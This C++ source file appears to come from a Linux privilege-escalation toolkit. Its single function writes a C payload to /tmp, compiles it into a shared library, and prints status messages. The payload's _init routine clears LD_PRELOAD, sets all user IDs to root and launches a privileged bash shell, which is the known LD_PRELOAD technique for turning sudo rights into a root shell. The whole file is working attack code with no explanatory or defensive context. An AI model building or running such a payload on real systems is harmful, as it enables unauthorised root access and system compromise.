#include <iostream>
#include <fstream>
#include <unistd.h>
void LD_PRELOAD_SHELL(void)
{
	std::string LD_PRELOAD_C = 
		"#include <stdio.h>\n"
		"#include <sys/types.h>\n"
		"#include <stdlib.h>\n"

  		
		"void _init(){ \n"

 		 "	unsetenv(\"LD_PRELOAD\");\n"
 		 "	setresuid(0,0,0);\n"
 		 "	system(\"/bin/bash -p\");\n"

		"}\n";

	putchar('\n');
	std::cout << "--------------------------------------" << std::endl;

	putchar('\n');
    std::cout << "     ~  LD_PRELOAD  ~" << std::endl;
    putchar('\n');
	std::cout << "[+] ARE YOU SURE YOU WANT TO CONTINUE? [Y/N]: ";
	std::string answer;
	std::cin >> answer;
	if (answer == "Y" or answer == "y")
	{
		std::cout << "\n[+] SAVING PAYLOAD" << std::endl;
		std::ofstream outf{"/tmp/preload.c"};
		if (!outf)
		{
			std::cerr << "[!] ERROR WRITING PAYLOAD TO FILE\n" << std::endl;
			exit(EXIT_FAILURE);
		}
		else 
		{
			outf << LD_PRELOAD_C;
			try	
			{
				std::system("gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /tmp/preload.c");
				std::cout << "[+] Successfully Created LD_PRELOAD Shared Object Library Shell to /tmp/preload.so" << std::endl;
					

			}
			
			catch (int a)
			{
				std::cerr << "[!] ERROR COMPILING C PAYLOAD VIA GCC" << a << std::endl;
			}

		}
	}
	else
	{
		exit(EXIT_FAILURE);
	}

	
}
